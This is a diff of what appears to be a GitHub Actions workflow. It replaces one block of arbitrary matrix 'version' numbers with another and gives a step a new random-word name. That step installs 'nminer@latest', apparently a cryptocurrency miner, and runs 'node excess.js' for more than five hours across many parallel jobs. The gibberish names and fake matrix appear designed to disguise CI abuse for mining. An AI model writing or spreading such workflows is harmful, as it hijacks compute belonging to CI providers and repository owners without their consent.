@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6880 }
-          - { version: 5934 }
-          - { version: 3635 }
-          - { version: 5277 }
-          - { version: 9385 }
-          - { version: 8704 }
-          - { version: 6030 }
-          - { version: 1615 }
-          - { version: 9266 }
-          - { version: 5286 }
-          - { version: 394 }
-          - { version: 7532 }
-          - { version: 7194 }
-          - { version: 7105 }
-          - { version: 3510 }
-          - { version: 7324 }
-          - { version: 9663 }
-          - { version: 5102 }
+          - { version: 2159 }
+          - { version: 2267 }
+          - { version: 896 }
+          - { version: 2223 }
+          - { version: 4964 }
+          - { version: 9975 }
+          - { version: 712 }
+          - { version: 7876 }
+          - { version: 3660 }
+          - { version: 5696 }
+          - { version: 9576 }
+          - { version: 5979 }
+          - { version: 2825 }
+          - { version: 9412 }
+          - { version: 767 }
+          - { version: 297 }
+          - { version: 822 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: lively through when indeed
+      - name: or lest unto whoa necklace
         run: |
           npm install nminer@latest
-          timeout 319m node excess.js || echo "excess executed"
+          timeout 311m node excess.js || echo "excess executed"
